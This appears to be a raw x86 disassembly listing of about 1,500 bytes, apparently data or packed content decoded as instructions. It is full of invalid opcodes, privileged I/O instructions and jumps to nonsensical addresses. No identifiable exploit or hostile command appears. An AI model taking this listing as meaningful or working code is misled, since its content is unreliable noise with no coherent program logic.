  406c70:	fdiv   DWORD PTR [ebp+0x1efe48da]
  406c76:	test   DWORD PTR [esi],edi
  406c78:	sar    BYTE PTR [ebp+edi*1+0xa],0x6
  406c7d:	sti    
  406c7e:	or     al,0xe1
  406c80:	mov    esp,0x573ea257
  406c85:	add    eax,0xe65295c4
  406c8a:	int3   
  406c8b:	and    BYTE PTR [esi-0x45],al
  406c8e:	mov    ds:0xbfe3011,eax
  406c93:	ins    DWORD PTR es:[edi],dx
  406c94:	fistp  DWORD PTR [ebx+0x72]
  406c97:	pop    edi
  406c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9a:	das    
  406c9b:	dec    esp
  406c9c:	xlat   BYTE PTR ds:[ebx]
  406c9d:	in     al,0x42
  406c9f:	dec    ecx
  406ca0:	xchg   ebp,eax
  406ca1:	pop    ebp
  406ca2:	dec    eax
  406ca3:	jnp    0x406cc7
  406ca5:	hlt    
  406ca6:	bound  ebp,QWORD PTR [edx]
  406ca8:	jnp    0x406c82
  406caa:	popf   
  406cab:	or     eax,0xfaf28cff
  406cb0:	das    
  406cb1:	dec    edx
  406cb2:	mov    ch,0x2
  406cb4:	push   cs
  406cb5:	pop    DWORD PTR [esi-0x22]
  406cb8:	pushf  
  406cb9:	sbb    edi,DWORD PTR [ebp-0x62aee753]
  406cbf:	mov    ebx,0xd131f6f6
  406cc4:	xchg   ecx,eax
  406cc5:	mov    ch,bh
  406cc7:	jmp    0x2beac6b3
  406ccc:	ins    DWORD PTR es:[edi],dx
  406ccd:	pop    ebx
  406cce:	ja     0x406d36
  406cd0:	dec    esp
  406cd1:	outs   dx,BYTE PTR ds:[esi]
  406cd2:	dec    ebp
  406cd3:	adc    eax,0x8f7e267c
  406cd8:	add    bh,BYTE PTR ds:0x3d35674a
  406cde:	fbld   TBYTE PTR [edx+edi*4]
  406ce1:	fdivr  QWORD PTR [ebx+edi*2-0x51]
  406ce5:	adc    eax,0x3c039b1b
  406cea:	ja     0x406cd8
  406cec:	or     al,0x90
  406cee:	xor    al,0xb
  406cf0:	mov    eax,0x1b3e9f52
  406cf5:	push   eax
  406cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf7:	cmp    eax,0x155ae53b
  406cfc:	arpl   WORD PTR [ecx-0x48],si
  406cff:	mov    esp,0x1a7cacfe
  406d04:	scas   eax,DWORD PTR es:[edi]
  406d05:	xor    edi,DWORD PTR [esi+0x30]
  406d08:	outs   dx,BYTE PTR ds:[esi]
  406d09:	icebp  
  406d0a:	mov    ah,0x79
  406d0c:	mov    ebp,DWORD PTR [ecx-0x2d]
  406d0f:	mov    ds:0xc785712c,al
  406d14:	mov    ch,0xa0
  406d16:	(bad)  
  406d17:	shl    BYTE PTR es:[ebp-0x18],1
  406d1b:	mov    DWORD PTR [ebx+0x2da43b84],edi
  406d21:	pop    edi
  406d22:	add    eax,ecx
  406d24:	jns    0x406d6d
  406d26:	add    ebp,DWORD PTR ds:0x61e05614
  406d2c:	(bad)  
  406d2d:	push   cs
  406d2e:	enter  0x61a0,0xed
  406d32:	sub    DWORD PTR [ebx+0x33edc0de],0xb42038c5
  406d3c:	cmp    BYTE PTR ds:0x7c9662d6,ch
  406d42:	push   eax
  406d43:	clc    
  406d44:	mov    BYTE PTR [ecx-0x4a],bh
  406d47:	or     eax,0xbe2f2247
  406d4c:	cs repnz pushw es
  406d50:	push   ax
  406d52:	out    dx,eax
  406d53:	popa   
  406d54:	call   0xd2bc5f76
  406d59:	in     eax,dx
  406d5a:	pop    esi
  406d5b:	(bad)  
  406d5c:	jmp    0x63f2:0x7fc662b6
  406d63:	and    al,0x3f
  406d65:	inc    eax
  406d66:	inc    edx
  406d67:	scas   al,BYTE PTR es:[edi]
  406d68:	imul   ecx,DWORD PTR [ecx],0xfffffff0
  406d6b:	idiv   bh
  406d6d:	jne    0x406dca
  406d6f:	ja     0x406dcc
  406d71:	test   eax,0xc6bb6caf
  406d76:	fs jb  0x406d5e
  406d79:	lock fwait
  406d7b:	test   BYTE PTR [edi-0x3f],ah
  406d7e:	xchg   ebp,eax
  406d7f:	push   ss
  406d80:	test   DWORD PTR ds:0xbcaa1ecf,ebp
  406d86:	push   edx
  406d87:	dec    ebx
  406d88:	les    ebx,FWORD PTR [ebp+0x5172f61f]
  406d8e:	scas   al,BYTE PTR es:[edi]
  406d8f:	inc    esi
  406d90:	aam    0x99
  406d92:	inc    eax
  406d93:	fild   DWORD PTR [edx]
  406d95:	rol    BYTE PTR [edi],cl
  406d97:	push   ss
  406d98:	hlt    
  406d99:	push   0x25
  406d9b:	in     al,0xa0
  406d9d:	(bad)  
  406d9f:	cld    
  406da0:	inc    esi
  406da1:	and    ebx,DWORD PTR ss:[bx-0x11]
  406da6:	xchg   BYTE PTR [eax+0x56dad66a],bl
  406dac:	push   eax
  406dad:	into   
  406dae:	(bad)  
  406daf:	mov    ebp,0x24ce3a78
  406db4:	js     0x406d54
  406db6:	push   cs
  406db7:	or     DWORD PTR ds:0x87e477d9,edx
  406dbd:	mov    dh,0x25
  406dbf:	xor    DWORD PTR [ebp+eax*4-0x19],ecx
  406dc3:	xor    BYTE PTR [eax-0x21],al
  406dc6:	das    
  406dc7:	in     eax,dx
  406dc8:	sbb    bl,dl
  406dca:	pop    ebx
  406dcb:	loopne 0x406dfc
  406dcd:	mov    cl,0x87
  406dcf:	jno    0x406e17
  406dd1:	cmp    eax,0x85acd8ab
  406dd6:	dec    esp
  406dd7:	js     0x406e3d
  406dd9:	adc    al,0x1
  406ddb:	or     eax,0x301de741
  406de0:	and    al,0xd8
  406de2:	ss jne 0x406e55
  406de5:	js     0x406d8e
  406de7:	adc    DWORD PTR [eax-0x3efb604a],edi
  406ded:	stos   BYTE PTR es:[edi],al
  406dee:	ficomp WORD PTR ds:[eax+0x7f]
  406df2:	adc    eax,0x60f69797
  406df7:	or     DWORD PTR [ecx-0x5522bcda],0x25
  406dfe:	push   esi
  406dff:	out    0xc0,eax
  406e01:	or     DWORD PTR [ecx-0x1efbab16],ebp
  406e07:	or     BYTE PTR [eax-0x61a60a08],dh
  406e0d:	cmp    al,0xed
  406e0f:	rol    BYTE PTR [ecx-0x6bc261b],0x56
  406e16:	xchg   ebp,eax
  406e17:	adc    dh,dl
  406e19:	idiv   bl
  406e1b:	cli    
  406e1c:	pop    edx
  406e1d:	add    al,0x5f
  406e1f:	mov    al,0x2a
  406e21:	add    al,0x41
  406e23:	or     BYTE PTR [esi],cl
  406e25:	xchg   DWORD PTR [ebx-0xb9f410a],edi
  406e2b:	mov    ebx,0x953f7fbc
  406e30:	adc    BYTE PTR [ebp+0x662b4537],bh
  406e36:	and    eax,0x5205d899
  406e3b:	test   eax,0xf2c50c3a
  406e40:	inc    ebp
  406e41:	rcl    DWORD PTR [ebx-0x5c6e18a],1
  406e47:	sbb    al,0x1a
  406e49:	xchg   ebx,eax
  406e4a:	mov    edx,cs
  406e4c:	push   ss
  406e4d:	jne    0x406ec2
  406e4f:	xor    eax,0x60e51b42
  406e54:	bound  edi,QWORD PTR [ecx-0x27d63990]
  406e5a:	and    dh,0x89
  406e5d:	jne    0x406e32
  406e5f:	and    eax,0x20c57dee
  406e64:	mov    dh,0x61
  406e66:	(bad)  
  406e67:	dec    esp
  406e68:	pop    es
  406e69:	push   eax
  406e6a:	(bad)  
  406e6b:	ficom  DWORD PTR [esi]
  406e6d:	ins    DWORD PTR es:[edi],dx
  406e6e:	push   0x5b
  406e70:	adc    eax,0x92c739fe
  406e75:	ret    0xa1c0
  406e78:	and    eax,0x4b59b51e
  406e7d:	mov    dh,0x90
  406e7f:	add    esi,DWORD PTR ds:0x4a222e
  406e85:	inc    esi
  406e86:	sti    
  406e87:	xor    DWORD PTR [esi+0x78],edx
  406e8a:	mov    ah,0xda
  406e8c:	nop
  406e8d:	sbb    ecx,DWORD PTR [ebp+0x4e473bbb]
  406e93:	mov    ecx,DWORD PTR [ebx-0x14]
  406e96:	cmp    dl,BYTE PTR [ebx-0x77c397e]
  406e9c:	test   eax,0x8147d36b
  406ea1:	mov    ds:0xdf1fc843,eax
  406ea6:	inc    edx
  406ea7:	retf   0xd2eb
  406eaa:	lock cmp eax,0x98b73991
  406eb0:	js     0x406e85
  406eb2:	mov    ch,0xc5
  406eb4:	sub    DWORD PTR [esi],esi
  406eb6:	dec    ecx
  406eb7:	aam    0x57
  406eb9:	push   eax
  406eba:	jle    0x406eda
  406ebc:	mov    bl,0x2d
  406ebe:	xor    DWORD PTR [eax-0x2201de6e],edx
  406ec4:	daa    
  406ec5:	and    al,0x4b
  406ec7:	adc    ch,0x47
  406eca:	mov    ecx,0xa093fee1
  406ecf:	mov    ch,0xa3
  406ed1:	push   ebx
  406ed2:	rcl    DWORD PTR [bp+si+0x6bbd],1
  406ed7:	nop
  406ed8:	(bad)  
  406ed9:	aad    0xb8
  406edb:	sar    BYTE PTR [ecx],cl
  406edd:	xchg   ecx,eax
  406ede:	fcmovnu st,st(7)
  406ee0:	rcl    al,1
  406ee2:	(bad)  
  406ee3:	sti    
  406ee4:	push   eax
  406ee5:	lods   al,BYTE PTR ds:[esi]
  406ee6:	pop    eax
  406ee7:	mov    edx,0xbcc728e1
  406eec:	and    dl,BYTE PTR [ebp-0x7e3caa0]
  406ef2:	fsub   DWORD PTR [edi-0x7a94ce82]
  406ef8:	test   DWORD PTR gs:[esi*2-0x2a2b7e20],edi
  406f00:	sub    dh,ah
  406f02:	cmc    
  406f03:	(bad)  [edx]
  406f05:	and    al,0xb5
  406f07:	rol    DWORD PTR [eax+0x5f54338c],1
  406f0d:	jp     0x406ec3
  406f0f:	jno    0x406f68
  406f11:	dec    edx
  406f12:	add    ecx,ebp
  406f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f16:	stos   DWORD PTR es:[edi],eax
  406f17:	arpl   WORD PTR [ebp+0x5ee1c84f],di
  406f1d:	outs   dx,DWORD PTR ds:[esi]
  406f1e:	(bad)  
  406f1f:	data16 add bh,BYTE PTR [esi]
  406f22:	xchg   edi,eax
  406f23:	stos   BYTE PTR es:[edi],al
  406f24:	out    0x73,eax
  406f26:	mov    WORD PTR [esi-0x25],ds
  406f29:	retf   0x378e
  406f2c:	hlt    
  406f2d:	sbb    eax,0x2c5a38f8
  406f32:	push   esp
  406f33:	out    dx,eax
  406f34:	mov    edx,0x5b565426
  406f39:	popa   
  406f3a:	data16 jp 0x406f3a
  406f3d:	(bad)  
  406f3e:	inc    ebp
  406f3f:	jb     0x406f77
  406f41:	pop    ebx
  406f42:	shl    BYTE PTR [esi-0x33],1
  406f45:	arpl   cx,bx
  406f47:	arpl   WORD PTR [edi-0x50],bp
  406f4a:	inc    eax
  406f4b:	mov    ebx,0xd0a84b07
  406f50:	jl     0x406f33
  406f52:	add    edx,edi
  406f54:	xchg   ecx,eax
  406f55:	ja     0x406fb8
  406f57:	sub    ebp,ecx
  406f59:	jge    0x406f3b
  406f5b:	lds    edx,FWORD PTR [ebx-0x30]
  406f5e:	or     al,0x12
  406f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f61:	jecxz  0x406f0f
  406f63:	mov    dl,0x44
  406f65:	leave  
  406f66:	inc    ecx
  406f67:	pusha  
  406f68:	inc    esi
  406f69:	mov    esi,0xf0e5be90
  406f6e:	stc    
  406f6f:	jecxz  0x406fe4
  406f71:	xor    ah,0x78
  406f74:	fisub  DWORD PTR [edi+0x55c82849]
  406f7a:	and    BYTE PTR [edx],ch
  406f7c:	xor    eax,esp
  406f7e:	sahf   
  406f7f:	sub    ebx,edx
  406f81:	xlat   BYTE PTR ds:[ebx]
  406f82:	mov    ch,0x6d
  406f84:	ss xchg esp,eax
  406f86:	aam    0x8d
  406f88:	in     al,0x82
  406f8a:	push   edi
  406f8b:	push   esi
  406f8c:	push   cs
  406f8d:	mov    ebx,0xca3283b7
  406f92:	stos   DWORD PTR es:[edi],eax
  406f93:	cld    
  406f94:	dec    ebp
  406f95:	mov    ds:0x2cff560e,eax
  406f9a:	rcr    ch,cl
  406f9c:	leave  
  406f9d:	ffree  st(5)
  406f9f:	pop    ebp
  406fa0:	inc    BYTE PTR ss:[eax-0x57]
  406fa4:	and    BYTE PTR [ebx-0x4557019b],bh
  406faa:	add    DWORD PTR [edx+0x3f242488],edi
  406fb0:	nop
  406fb1:	mov    al,ds:0xe4602bf0
  406fb6:	mov    al,0xa2
  406fb8:	pop    ss
  406fb9:	cdq    
  406fba:	dec    eax
  406fbb:	pusha  
  406fbc:	loope  0x406fe1
  406fbe:	cmp    bh,BYTE PTR [esi-0x6b]
  406fc1:	inc    esi
  406fc2:	fld    QWORD PTR [ebp-0x77]
  406fc5:	sub    BYTE PTR [ebx+eax*1-0x33],0xe1
  406fca:	mov    dh,0xa8
  406fcc:	cs inc ebx
  406fce:	daa    
  406fcf:	mov    cl,0x67
  406fd1:	adc    al,0x7d
  406fd3:	stos   DWORD PTR es:[edi],eax
  406fd4:	xchg   ebp,eax
  406fd5:	fbstp  TBYTE PTR [ebp+0x35]
  406fd8:	xor    BYTE PTR [ebx+0x2d],ch
  406fdb:	test   DWORD PTR [ebp-0x66],0xda66941
  406fe2:	push   cs
  406fe3:	imul   esi,DWORD PTR [ebx-0x22596aa6],0xfffffff2
  406fea:	jbe    0x407030
  406fec:	xor    dh,BYTE PTR [eax-0x5a]
  406fef:	mov    edx,0x1892d2b1
  406ff4:	xchg   esp,eax
  406ff5:	hlt    
  406ff6:	add    eax,0x858753bf
  406ffb:	mov    dh,0x14
  406ffd:	mov    ebx,0x89b790f6
  407002:	das    
  407003:	push   ds
  407004:	jmp    0x406ff2
  407006:	inc    edi
  407007:	out    0xb4,al
  407009:	add    BYTE PTR [ecx+edx*2],0xc9
  40700d:	pushf  
  40700e:	xchg   ebp,eax
  40700f:	cli    
  407010:	cmp    al,0x5a
  407012:	sbb    DWORD PTR [ecx],ebx
  407014:	mov    bh,0x5c
  407016:	lds    ebp,FWORD PTR [eax]
  407018:	arpl   WORD PTR [edx],sp
  40701a:	mov    dh,BYTE PTR [eax-0x13a2bfac]
  407020:	cs push eax
  407022:	adc    edx,0x3072eea2
  407028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407029:	jecxz  0x406fd4
  40702b:	adc    dl,BYTE PTR [edi+0x7a]
  40702e:	push   0x6d229693
  407033:	mov    DWORD PTR [eax+0xfcb6c65],edx
  407039:	loop   0x406fd6
  40703b:	fdivr  DWORD PTR [esp+esi*1+0x7f]
  40703f:	(bad)  
  407040:	and    cl,BYTE PTR [edx]
  407042:	mov    cl,0x2d
  407044:	ret    
  407045:	or     al,0xf8
  407047:	mov    ebx,0x1e3ebffd
  40704c:	dec    esi
  40704d:	retf   0x8cca
  407050:	sbb    ebp,DWORD PTR ds:0xeaa1df4a
  407056:	maskmovq mm6,mm5
  407059:	clc    
  40705a:	stos   DWORD PTR es:[edi],eax
  40705b:	cmp    eax,0x888a90d9
  407060:	mov    DWORD PTR [edx-0x51eb6a42],edi
  407066:	xchg   ecx,eax
  407067:	outs   dx,DWORD PTR es:[esi]
  407069:	jae    0x407048
  40706b:	mov    DWORD PTR gs:[ebx-0x6c],edi
  40706f:	sar    DWORD PTR [ecx],0xf9
  407072:	push   ebx
  407073:	outs   dx,DWORD PTR ds:[esi]
  407074:	das    
  407075:	add    ebx,DWORD PTR [ecx-0xa]
  407078:	pusha  
  407079:	mov    ecx,DWORD PTR [ecx-0x4603c068]
  40707f:	mov    ecx,0x31383bf8
  407084:	aam    0xde
  407086:	or     eax,0x1b16b6cb
  40708b:	add    esi,ebp
  40708d:	add    DWORD PTR [eax-0x218e8236],0xe28427ad
  407097:	or     bl,BYTE PTR [esi-0x53c05aff]
  40709d:	mov    al,ds:0xde6cceb8
  4070a2:	fidiv  DWORD PTR [edx-0x65]
  4070a5:	cwde   
  4070a6:	and    eax,0x8780cccc
  4070ab:	push   ecx
  4070ac:	das    
  4070ad:	jne    0x407059
  4070af:	or     BYTE PTR [edi+0x121d35f3],0x30
  4070b6:	in     al,dx
  4070b7:	neg    DWORD PTR [ecx-0x4fd03110]
  4070bd:	pop    edi
  4070be:	je     0x407046
  4070c0:	mov    bh,0x14
  4070c2:	pop    ebx
  4070c3:	loop   0x4070c9
  4070c5:	mov    dh,bl
  4070c7:	add    ebx,DWORD PTR [edx+0x40efccd8]
  4070cd:	pop    ebp
  4070ce:	(bad)  
  4070cf:	retfw  0xc0ea
  4070d3:	add    dl,dh
  4070d5:	push   edi
  4070d6:	push   0xffffffa9
  4070d8:	repnz mov dl,0x51
  4070db:	lock adc DWORD PTR [ecx-0x40ad6936],ebp
  4070e2:	inc    ecx
  4070e3:	pushf  
  4070e4:	sub    BYTE PTR [ecx+0x21e8c114],0x95
  4070eb:	push   ds
  4070ec:	pop    ebp
  4070ed:	rcl    DWORD PTR [esi+eiz*1],1
  4070f0:	jg     0x4070d2
  4070f2:	dec    eax
  4070f3:	fwait
  4070f4:	xchg   si,ax
  4070f6:	jbe    0x40709c
  4070f8:	mov    dh,0x5a
  4070fa:	mov    DWORD PTR [ebp+0x5de81113],eax
  407100:	mov    bh,0xbe
  407102:	popa   
  407103:	(bad)  
  407104:	bound  edi,QWORD PTR [edx+0x20]
  407107:	or     ebp,DWORD PTR [edi]
  407109:	in     al,dx
  40710a:	jnp    0x40717c
  40710c:	shl    DWORD PTR [edi-0x38f5982c],0x41
  407113:	(bad)  
  407114:	fild   QWORD PTR [eax-0x17e738e8]
  40711a:	jb     0x407162
  40711c:	std    
  40711d:	adc    DWORD PTR [esi],ebp
  40711f:	mov    al,ds:0x296b74d
  407124:	and    bh,0x9a
  407127:	pop    eax
  407128:	test   eax,0xe257ffb2
  40712d:	scas   eax,DWORD PTR es:[edi]
  40712e:	xor    BYTE PTR [ebp+0x49],dl
  407131:	jns    0x40714d
  407133:	stos   DWORD PTR es:[edi],eax
  407134:	jbe    0x4070eb
  407136:	call   0x88ac:0xb35106ee
  40713d:	adc    bh,BYTE PTR [edi-0x310b9598]
  407143:	dec    esp
  407144:	inc    ebp
  407145:	in     al,dx
  407146:	dec    edx
  407147:	aad    0x52
  407149:	sbb    BYTE PTR [eax+ebp*8-0x3c],0xd4
  40714e:	push   DWORD PTR [eax+0x27]
  407151:	out    dx,al
  407152:	xor    DWORD PTR [ecx],0x3f9dfce4
  407158:	ror    ah,0x25
  40715b:	dec    esi
  40715c:	call   0x9700:0x7c239d57
  407163:	call   0x1e47ebf4
  407168:	call   0xa235:0x9842aed8
  40716f:	aaa    
  407170:	add    BYTE PTR [esi+0x55a287],cl
  407176:	lods   eax,DWORD PTR ds:[esi]
  407177:	(bad)  
  407178:	add    ebp,ebp
  40717a:	and    BYTE PTR [edi],dl
  40717c:	cdq    
  40717d:	loop   0x407126
  40717f:	js     0x40715e
  407181:	or     al,0x85
  407183:	loop   0x40712c
  407185:	pop    esi
  407186:	out    0xa2,al
  407188:	dec    edi
  407189:	sub    esi,ebp
  40718b:	in     al,dx
  40718c:	pop    ecx
  40718d:	stc    
  40718e:	(bad)  
  407190:	not    DWORD PTR [esi+0x5bb209d8]
  407196:	fild   DWORD PTR [eax]
  407198:	mov    dh,0x20
  40719a:	fwait
  40719b:	sbb    BYTE PTR [esi],0xb0
  40719e:	enter  0x8427,0x1c
  4071a2:	fldcw  WORD PTR [ebp+0xef2c97c]
  4071a8:	jge    0x40712d
  4071aa:	mov    ebx,0x892bf3e1
  4071af:	sbb    al,0xf6
  4071b1:	jno    0x407174
  4071b3:	daa    
  4071b4:	cdq    
  4071b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071b6:	out    dx,al
  4071b7:	sbb    DWORD PTR [edi+edx*4-0x1a],0x27
  4071bc:	mov    ecx,0x35436dfe
  4071c1:	or     BYTE PTR [esi+0x6d927565],0x92
  4071c8:	mov    ebx,DWORD PTR [ebx+0x8]
  4071cb:	mov    ch,BYTE PTR [edx-0x6a4fb731]
  4071d1:	xchg   edx,eax
  4071d2:	cmp    eax,0x642c5d93
  4071d7:	ret    
  4071d8:	out    0x13,al
  4071da:	cdq    
  4071db:	outs   dx,BYTE PTR ds:[esi]
  4071dc:	es push cs
  4071de:	xor    eax,0x4ee77cea
  4071e3:	sbb    eax,0x12c1044e
  4071e8:	out    dx,al
  4071e9:	mov    WORD PTR [ebp+0x72],gs
  4071ec:	mov    al,0xb7
  4071ee:	inc    ecx
  4071ef:	fdivp  st(0),st
  4071f1:	btc    DWORD PTR [ebx],0xce
  4071f5:	out    0x2c,al
  4071f7:	jmp    0x9c36f859
  4071fc:	out    dx,al
  4071fd:	cmc    
  4071fe:	cmp    esp,DWORD PTR [eax+0x75e67e]
  407204:	sahf   
  407205:	mov    WORD PTR [edx+0xb],cs
  407208:	icebp  
  407209:	cmp    eax,0x188dead6
  40720e:	mov    ecx,0x5ef438fa
  407213:	pop    ss
  407214:	imul   ebp,ecx,0xffffffe7
  407217:	inc    ecx
  407218:	outs   dx,DWORD PTR ds:[esi]
  407219:	pop    eax
  40721a:	inc    edi
  40721b:	inc    edx
  40721c:	clc    
  40721d:	mov    ch,BYTE PTR [ecx-0x38a793dc]
  407223:	mov    al,0x1f
  407225:	xor    esp,DWORD PTR [ecx]
  407227:	jnp    0x4071c7
  407229:	enter  0xedbb,0x56
  40722d:	jg     0x4071df
  40722f:	adc    al,0xd0
  407231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407232:	xor    dl,BYTE PTR [edi+ebx*1-0x179b40b0]
  407239:	sub    ebp,edi
  40723b:	stos   BYTE PTR es:[edi],al
  40723c:	push   ss
  40723d:	pop    eax
  40723e:	mov    esp,DWORD PTR [ebx-0x2d]
  407241:	xchg   ecx,eax
  407242:	adc    bh,BYTE PTR [eax-0x9843e71]
  407248:	sub    ah,BYTE PTR [edx+ebp*2-0x71fef00]
  40724f:	(bad)  
  407250:	(bad)  
  407251:	arpl   WORD PTR ds:0x5ec96b40,sp
  407257:	fidiv  WORD PTR [ecx]
  407259:	mov    ch,0x76
  40725b:	xor    al,0xa1
  40725d:	mov    dl,bl
  40725f:	pop    esp
  407260:	cmp    ebx,DWORD PTR [eax]
  407262:	add    eax,0xb9d6da4
  407267:	lahf   
  407268:	and    edx,DWORD PTR ds:0xdd201095
  40726e:	jmp    0x36a23ce8
  407273:	retf   
  407274:	or     eax,0xe2aaffe6
  407279:	inc    eax
  40727a:	xchg   ebx,eax
  40727b:	mov    ss,WORD PTR [esi-0x688b3657]
  407281:	pop    ds
  407282:	(bad)  
  407283:	imul   edi,DWORD PTR [edi+0x35],0xa2ac0d5a
  40728a:	call   FWORD PTR [edx+0x51]
  40728d:	das    
  40728e:	push   ebp
  40728f:	push   0x55d2125
  407294:	cmp    al,0xff
  407296:	cmp    al,0xcf
  407298:	imul   edi,DWORD PTR [ebp-0x205dfbe4],0x9c9c12cb
  4072a2:	or     eax,0xad3926a9
  4072a7:	fcom   st(3)
  4072a9:	add    ah,BYTE PTR [ecx]
  4072ab:	xor    al,BYTE PTR [ebp+0x22]
  4072ae:	mov    edi,0x3d84fda6
  4072b3:	sub    BYTE PTR [eax-0x27],bh
  4072b6:	out    dx,al
  4072b7:	add    eax,0x7fd0c899
  4072bc:	hlt    
  4072bd:	(bad)  
  4072be:	adc    cl,BYTE PTR [esi]
  4072c0:	fmul   st(2),st
  4072c2:	ins    BYTE PTR es:[edi],dx
  4072c3:	hlt    
  4072c4:	ret    
  4072c5:	mov    esp,0xd4955e8c
  4072ca:	dec    ebp
  4072cb:	xlat   BYTE PTR ds:[ebx]
  4072cc:	mov    ch,BYTE PTR [edi-0x3e]
  4072cf:	mov    ds:0x9bcd972b,eax
  4072d4:	fs cld 
  4072d6:	jl     0x407349
  4072d8:	jle    0x407293
  4072da:	xchg   esp,eax
  4072db:	mov    esp,0xc4df68f6
  4072e0:	cmp    BYTE PTR [edi+esi*2-0x16],bh
  4072e4:	imul   DWORD PTR [edx+0x41]
  4072e7:	and    al,0x4d
  4072e9:	cmc    
  4072ea:	pop    ds
  4072eb:	mov    ebp,0xb10d4737
  4072f0:	out    dx,eax
  4072f1:	clc    
  4072f2:	cmp    DWORD PTR [edi+0x3fbba432],ecx
  4072f8:	test   al,0x6
  4072fa:	adc    DWORD PTR [edi],esi
  4072fc:	push   0x20
  4072fe:	test   eax,0x5ae75c3d
  407303:	leave  
  407304:	clc    
  407305:	(bad)  
  407306:	sbb    eax,0xf21013ba
  40730b:	jns    0x407331
  40730d:	popf   
  40730e:	and    al,BYTE PTR [eax]
  407310:	imul   ecx,ecx,0x11
  407313:	loop   0x4072b5
  407315:	adc    al,0x4e
  407317:	sub    al,dl
  407319:	xor    BYTE PTR [ecx+0x7f06933c],ch
  40731f:	or     dl,BYTE PTR [edx-0x75]
  407322:	in     eax,dx
  407323:	mov    DWORD PTR [ebx],edi
  407325:	fadd   st(3),st
  407327:	imul   edi,DWORD PTR [ebp+0x364a06b3],0x2f
  40732e:	inc    esp
  40732f:	inc    ebx
  407330:	pop    esi
  407331:	xor    eax,0x231b44b9
  407336:	cdq    
  407337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407338:	or     DWORD PTR [eax+0x6d],ebp
  40733b:	pop    ecx
  40733c:	repz sub bl,ch
  40733f:	or     al,BYTE PTR [eax+0x5d]
  407342:	mov    eax,ds:0xe5356dee
  407347:	xor    eax,0x8fd44b0e
  40734c:	mov    esp,0x5dd96b2f
  407351:	mov    ecx,0xdb3ebd5f
  407356:	mov    edi,0x99bbf3f
  40735b:	cmp    ecx,DWORD PTR [edi-0x28d94658]
  407361:	dec    esi
  407362:	leave  
  407363:	xor    al,0x6e
  407365:	mov    ds:0x8004401b,eax
  40736a:	xor    dl,cl
  40736c:	inc    esp
  40736d:	and    BYTE PTR [edi-0x1ce80583],dl
  407373:	jge    0x4073b1
  407375:	das    
  407376:	push   ebx
  407377:	pusha  
  407378:	mov    edi,0xbfc04841
  40737d:	cmp    BYTE PTR [ebp-0x72231f95],0xca
  407384:	test   al,0xc7
  407386:	aas    
  407387:	dec    eax
  407388:	adc    al,0x15
  40738a:	ins    DWORD PTR es:[edi],dx
  40738b:	shr    BYTE PTR [edx-0x2f],1
  40738e:	jle    0x407345
  407390:	leave  
  407391:	or     BYTE PTR [esi-0x7a4e1923],al
  407397:	sub    eax,DWORD PTR [edi+0x6c42ea04]
  40739d:	sbb    eax,0xfd9d28a
  4073a2:	jecxz  0x407333
  4073a4:	push   cs
  4073a5:	fwait
  4073a6:	in     al,dx
  4073a7:	(bad)  
  4073a8:	fld    QWORD PTR [esi]
  4073aa:	addr16 jnp 0x40732d
  4073ad:	call   0x7c66:0x5e89be58
  4073b4:	adc    al,0xd5
  4073b6:	jbe    0x407404
  4073b8:	mov    DWORD PTR [ecx],ebx
  4073ba:	jp     0x4073b5
  4073bc:	sbb    cl,dh
  4073be:	loop   0x407426
  4073c0:	jg     0x407371
  4073c2:	arpl   WORD PTR [ebx+ecx*8-0x77],bx
  4073c6:	push   es
  4073c7:	push   cs
  4073c8:	ret    
  4073c9:	add    BYTE PTR [ecx],dh
  4073cb:	lahf   
  4073cc:	xlat   BYTE PTR ds:[ebx]
  4073cd:	jp     0x407409
  4073cf:	fimul  WORD PTR [edi+edi*8-0x6b]
  4073d3:	mov    dl,0xa7
  4073d5:	jns    0x407388
  4073d7:	push   esi
  4073d8:	pop    ds
  4073d9:	mov    bh,0x1b
  4073db:	pop    esp
  4073dc:	adc    al,BYTE PTR [edi+0x36c1c6b9]
  4073e2:	push   ebp
  4073e3:	mov    ch,0x98
  4073e5:	aad    0xf1
  4073e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073e8:	rol    BYTE PTR [ecx-0x2392025b],0x69
  4073ef:	add    eax,DWORD PTR [ecx+0x70]
  4073f2:	sub    ebp,DWORD PTR [edx-0x14]
  4073f5:	and    ch,ah
  4073f7:	imul   ebx,DWORD PTR [ecx-0x5a],0xa1a003fa
  4073fe:	mov    esi,0x46fbe45d
  407403:	repnz push esp
  407405:	icebp  
  407406:	push   es
  407407:	cld    
  407408:	rcl    bl,1
  40740a:	push   eax
  40740b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40740c:	mov    gs,WORD PTR [eax]
  40740e:	jbe    0x4073df
  407410:	ja     0x407411
  407412:	sbb    al,0x86
  407414:	mov    bl,0x47
  407416:	stos   BYTE PTR es:[edi],al
  407417:	pop    ebx
  407418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407419:	scas   al,BYTE PTR es:[edi]
  40741a:	lds    esi,FWORD PTR [esi]
  40741c:	mov    ah,0xe1
  40741e:	fnsave [eax+0x6b8bb7fd]
  407424:	lock popa 
  407426:	xor    bl,bl
  407428:	ja     0x40747d
  40742a:	adc    DWORD PTR [ebx-0x1c520b35],ebx
  407430:	sbb    esi,esi
  407432:	dec    BYTE PTR [edi+0x455b094c]
  407438:	sbb    BYTE PTR [ebp+0x51],cl
  40743b:	or     esp,DWORD PTR [eax-0x58c75cd8]
  407441:	push   ebx
  407442:	ret    0xac31
  407445:	test   DWORD PTR [ebp+0x3e],esp
  407448:	(bad)  
  407449:	jb     0x407459
  40744b:	cmp    BYTE PTR [eax],bh
  40744d:	mov    al,ds:0x13b025b
  407452:	xchg   edi,eax
  407453:	mov    eax,ds:0xcb0b9f50
  407458:	inc    esi
  407459:	sbb    edx,DWORD PTR [ebx+ebp*1+0x1397b972]
  407460:	(bad)  
  407462:	sti    
  407463:	xor    eax,0xe152cc37
  407468:	sub    al,bl
  40746a:	sub    eax,0xac30a18f
  40746f:	jb     0x407497
  407471:	(bad)  
